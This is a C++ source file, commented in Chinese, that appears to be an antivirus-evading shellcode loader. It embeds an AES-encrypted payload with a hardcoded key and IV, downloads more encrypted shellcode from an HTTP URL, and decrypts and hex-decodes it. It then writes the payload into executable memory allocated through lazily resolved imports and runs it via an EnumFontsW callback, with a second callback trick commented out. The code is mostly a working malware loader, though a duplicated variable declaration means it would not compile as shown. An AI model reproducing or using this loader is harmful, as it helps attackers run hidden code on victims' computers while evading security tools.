#define _CRT_SECURE_NO_DEPRECATE
#include <iostream>
#include "lazy_importer.hpp"
#define BUF_SIZE 4096
#include <windows.h>
#include "Shellcode加密库.h"

using namespace std;
char g_key[17] = "/TXlwa6H5,,$vV$0";   //填写key密钥
char g_iv[17] = "uiP1St&thydHGkC]";  //定义iv向量

void main(int argc, char* argv[])
{
	// 加密后的shellcode
	string buf = "Zq3ejgFVl/qtP/dqcQidBN6BKWTiL/KZZpfW+Iy8ZMnaA4Au2oEHMltr8TihG9yvvQ1MDt0PFqboWsF5ka9y72L9xJ5a4HRBFspK3vMwvtKMH8Xtko6ErmfUUB8pv4n4DybjQseeuYtPqEDGvX8zlwONk9nyu5r8aozfNCxLvnbFyzX5OLInbra87Az3FGhilZnCwMufIPZLgolhRkgyhnS96CsMst/pNz4AqcCNmfe7Gw1rcuVgHqETNxwIsNzWDmUguUJ173NHAZJpKmF1k39IYnF4JMvVk3QH81jzX68ClhGvADXnPlmz20PHzzjKOzkovpW4cPT3Q/1B2HOwWwhKPZdLKakJeuSa1YLwv6Nu3UdP8II6dGDVsgb4y/U7O1aiHbJFXSM5XXx7eKqTe8MV8gLfwNNR6M4qaWEm7XmdsE0WryhL5F1SFe/6uxPrcIFnGE3I0jVntLjYfVWotkkrEgL7M6rXlOgKHF3Pd6AIIPm23zULA9NyJsHuKmqOUgyzf7LiPxPcIqhNo5DA1opqCqBS3XTeusUjr6x3AyBT9MquUeJKuB7BBtWJWyuQzTzzSXaDRmErc6lSTM+DKTo101TZYKz4Jl2I8xDMey7IJT+Z1iYt/thgi1FeRLnrGAFKhNn3xAqjYORcKXLPGkSWq1MoZZxOJi6QF1uqMlB3tDBD6w/pAhuqHR+ZxnaHjfbqybG8rNLXc6hshmazoiFakC9QwHM9RgyVde9GGpkNr+wzjp1Tc1SbXSHtFHXumU1IP6NvLqU0/tWrTui9t8nrsqNFgGlQUXyAzmnk04vXJeD7kxGbSFSXwffPGUlOtDS1q/+P+fwj+ZvjpmiPLzoo+hgZ0UOtyO1ThltWr4rWitqMPneleC11qlVcyOp0odOTxuZiUeJyTOY9wHWwXg3snVWat23VSE7eQ4QWcF/GtfRVBsiGGENo1hH1nuxNTlEx/2os30f3IOj/yUfIXpuwHaWsNwlyw6119Z3PgCOdR+1qDCvJenZEsCkyjUJ830xC1V5VxCw1m0btTP+LaefsNEocc5V7fyNyaw0o72yl/g+bacycAbG/hIJlWbaXneDFysBLPtLFJjXm0gAsE3iyffdB9l6c8ffohInaNlWC8x7IDb4X6vrFC8cncDFb3NKIInVFR6bmqXfxXAamxzKXdpVjngPZg6YCWpTUtobZhThnhpO1KZxvHoFCcidxLq+mifWHpcldcS/ez2vWGdriSbd6i9FGGaxQQvHze1HmaLP/sj34JDMfIVfOI2/4sejnjluKfhcu5I0P76idHJKMDHr+rJBtpSxX3jc+UNlfeFmhjuN2Yy/TO1kLRfUdfAeZP2Vz4WhITdRf8bvqJA==";
	
	unsigned char bufs[4096] = { 0 };
	char url[MAX_PATH] = { "http://127.0.0.1:8000/shellcode.txt" };
	GetInterNetURLText(url, bufs);
	string buf((char*)bufs);
	
	// 解密shellcode
	string strbuf = DecryptionAES(buf, g_key, (char*)g_iv);

	//将解密的shellcode放到shellcode数组中
	char* p = (char*)strbuf.c_str();
	unsigned char* shellcode = (unsigned char*)calloc(strbuf.length() / 2, sizeof(unsigned char));
	for (size_t i = 0; i < strbuf.length() / 2; i++) {
		sscanf(p, "%02x", &shellcode[i]);
		p += 2;
	}

	//输出shellcode数组里的内容
	int ShellcodeSize = strbuf.length() / 2;
	printf("Decrypted buffer:\n");
	for (int i = 0; i < ShellcodeSize; i++) {
		printf("\\x%02x", shellcode[i]);
	}

	//加载shellcode
	char* orig_buffer;
	orig_buffer = (char*)LI_FN(VirtualAlloc)(nullptr, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	RtlMoveMemory(orig_buffer, shellcode, ShellcodeSize);
	
	//使用EnumUILanguages函数执行解密后的shellcode
	//EnumUILanguages((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);

	//使用EnumFontsW回调函数加载shellcode
	EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)orig_buffer, NULL);
}